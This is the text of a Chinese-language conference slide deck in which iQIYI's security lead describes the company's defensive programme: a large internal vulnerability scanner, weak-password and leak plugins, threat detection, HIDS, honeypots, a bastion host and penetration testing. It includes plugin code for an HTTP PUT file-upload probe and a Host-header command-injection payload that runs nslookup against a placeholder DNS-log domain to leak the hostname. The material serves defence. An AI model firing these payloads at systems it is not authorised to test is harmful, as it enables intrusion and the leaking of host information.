爱奇艺安全攻防实践
李劼杰
About Me
• 爱奇艺 安全云 SRC 负责人
• WooYun 白帽子 Rank TOP 10
• 腾讯 TSRC 2016 年度漏洞之王
李劼杰
http://www.lijiejie.com
subDomainsBrute / BBScan / githack / htpwdScan
Agenda
• 漏洞扫描
• 威胁感知
• 入侵检测
• 堡垒机
• 渗透测试
扫描器
现状
• 小机房端口策略过于宽松
• 资产变更频繁
• 服务间依赖复杂
20万+
开放端口
300万+
设计目标
稳定 高效
误报率低
高危漏洞覆盖全
任务管理合理
30 个扫描节点
每月完成约1亿次插件扫描
扫描组件
Web插件
弱口令插件
通用漏洞插件
信息泄露插件
集成AWVS
依赖Medusa
一些Python脚本
实现类似
BugScan
的扫描框架
集成BBScan
扫描策略
• 外网优先原则
• 插件分组
• 每6小时
• 严重漏洞
• 每天
• 高中危漏洞
• 每周
• 低危漏洞
• 首次发现的外网端口，最高优先级进入扫描队列
信息泄露插件
• https://github.com/lijiejie/BBScan 
• 压缩包
• git svn
• 配置文件
• 文件遍历
• URL + 简单规则
/composer/send_email?to=test@xxx&url=http://not.existed.domain
{status=200}  {tag="gaierror: [Errno -2]"}   {root_only}
弱口令插件
• 常见弱口令
• 远控卡弱口令
• IPMI Cipher 0
• IPMI hash泄露
SSH、RDP、samba、Telnet
FTP、VNC 、IPMI 、Rsync
MySQL、MS SQL Server、Postgres
Redis、MongoDB
Tomcat、ActiveMQ、RabbitMQ
通用漏洞插件
from port_cracker.plugin_scan.dummy import *
def do_scan(ip, port, service, task_msg):
if service.lower().find('http') < 0:
return
try:
url ='http://%s:%s' % (ip, port) + '/security-scan.txt'
curl_cmd = '-X "PUT" -d "202cb962ac59075b964b07152d234b70" %s' % url
code, head, res, errcode, _ = curl.curl(curl_cmd)
if code == 200:
code, head, res, errcode, _ = curl.curl(url)
if code == 200 and res.startswith('202cb962ac59075b964b07152d234b70'):
ret = {
'algroup': 'PUT File',
'affects': 'http://%s:%s' % (ip, port),
'details': 'PUT File Vulnerability\n\n' + url
}
return ret
except Exception as e:
pass
•
只需要实现 do_scan 函数
•
插件远程部署，可自动重载，无需重启扫描进程
资产发现
内部接口监控
全网PING
HIDS端口清点
新增
外网端口
等待任务调度
N
最高优先级扫描
海外虚机端口检查
Y
[mask] 分钟 内发现新设备
[mask] 分钟 内完成端口扫描
任务队列
资产发现
•
超过 40万个 HTTP服务，支持全文搜索
• Chrome Headless 动态爬虫进行全网URL收集， 支持全文索引
信息泄露
< 15MIN
内网巡检
< 2H
SSL证书扫描
• 证书过期
• 证书不匹配
• 弱加密算法
• 心脏滴血漏洞
• ATS合规
代理配置不当
正向 HTTP代理 Socks代理
未授权访问 ACL配置不当
黑客直接穿内网
DNS域传送
• DNS域传送配置不当
• 泄露网络拓扑
• 暴露攻击面
• 泄露敏感服务，如DB、后台
Header命令注入
• 在Request Header注入shell命令，被应用执行，如： 日志分析程序执行
def do_scan(ip, port, service, task_msg):
if service.lower().find('http') < 0:
return
host = '%s:%s' % (ip, port)
conn = httplib.HTTPConnection(host, timeout=20)
headers = {'Host': "$(nslookup hostname.`hostname`.%s-
%s.your.dns.log.domain)" % (ip, port),
'User-Agent': 'Mozilla/5.0 …',
}
conn.request('GET', '/', headers=headers)
conn.getresponse().read()
conn.close()
被动式代理扫描
• 解决URL覆盖率问题
•
缺少认证信息
•
角色覆盖不全
•
UA覆盖不全
• 解决 HOSTS 冲突
白盒代码扫描
集成Gitlab API               一键接入
提交代码自动触发
威胁感知
威胁感知
威胁检测
威胁告警
威胁预测
业务安全可度量
威胁场景
• 主机
•
命令执行、反弹shell
•
木马病毒
•
弱口令
•
高危端口对外
•
异常登录、暴力破解
•
堡垒机操作异常
•
篡改敏感文件
•
基线违规
•
开源组件存在漏洞
•
FFmpeg
•
fastjson
•
OpenSSL
•
…
• 应用
•
web shell
•
恶意程序（应用检测）
•
恶意程序（终端）
•
恶意程序（云查杀）
•
数据库
•
拖库
•
异常导出
•
异常连接
•
源代码泄露
•
危险 jar包、rpm包
•
Maven 日志
•
证书安全
• 网络
•
DDOS攻击
•
传播木马病毒
•
内网端口扫描
•
内网渗透
•
异常DNS
蜜罐
• 中高交互
•
基于MHN
•
SSH
•
ElasticSearch
•
高仿真蜜罐
•
…
• NIDS蜜罐
•
蠕虫病毒扫描
• 覆盖率问题
•
HIDS蜜罐端口转发
•
办公网电话交换机转发
•
接入层交换机虚IP转发
异常DNS
• 长度异常
•
Xshell后门
• 畸形域名
• 算法生成的域名
• 统计特征异常
• 威胁情报 - 黑名单
• 黑客工具域名
•
[mask] xss [mask]
•
Dnslog [mask]
•
Dnsl [mask]
•
xsse [mask]
•
…
内网渗透
•
黑客进入内网
•
收集信息
•
扩大权限
•
保持权限
•
窃取数据
• 日志源
•
OA
•
SSO
•
ERP
•
wiki
•
gitlab
•
…
IDPS
• 基于流量分析引擎 QNSM
扫描行为识别
木马病毒识别
攻击行为识别
运维基线违规
QNSM引擎 + 规则集
数据库审计
• MySQL Audit
•
异常访问
•
SQL注入
•
恶意拖库
• 性能损耗
•
≈ 10%
入侵检测
HIDS
•
资产清点
•
进程
•
端口
•
账户
•
authorized keys
•
jar包
•
rpm包
•
漏洞检测: 弱口令 dirtycow FFmpeg …
•
基线合规
•
爱奇艺安全bash
•
改进的 Rkhunter
•
反弹 shell、命令执行、webshell 检测
•
SSH爆破、web扫描检测
• 完善的发布策略
• 资源占用监控
• Cgroups 限制资源占用
基于
部署约10万台
快照检测
• 近实时进程快照
• 增量巡检扫描
•
挖矿木马
•
DDOS木马
•
Hack Tool
堡垒机
• 支持SSH、SFTP、RDP、VNC
• 支持双因素认证
• 灵活的规则配置
• 实时告警、实时阻断
• 支持录屏审计
• 支持组授权
• 支持备注登录、tab补全
渗透测试
• 标准化测试流程
• 标准化check list
•
Web
•
移动
• 标准化渗透测试环境
• 维护通用测试工具集